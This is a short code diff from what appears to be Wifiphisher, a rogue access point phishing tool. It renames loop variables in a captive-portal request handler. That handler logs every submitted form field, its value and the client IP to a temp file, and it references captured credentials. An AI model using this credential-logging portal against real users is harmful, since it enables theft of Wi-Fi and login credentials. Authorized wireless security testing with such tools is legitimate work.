@@ -53,11 +53,11 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         formValues = []
         for i in formData:
             formValues.append(i.split('='))
-        for i,x in formValues:
+        for inputName,inputValue in formValues:
             with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                 log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T + 
-                               self.request.remote_ip + W + " input[" + G + i + W + "] = " + 
-                               R + x + W + 
+                               self.request.remote_ip + W + " input[" + G + inputName + W + 
+                               "] = " + R + inputValue + W + 
                                "\n")
                 log_file.close()
         global terminate, creds
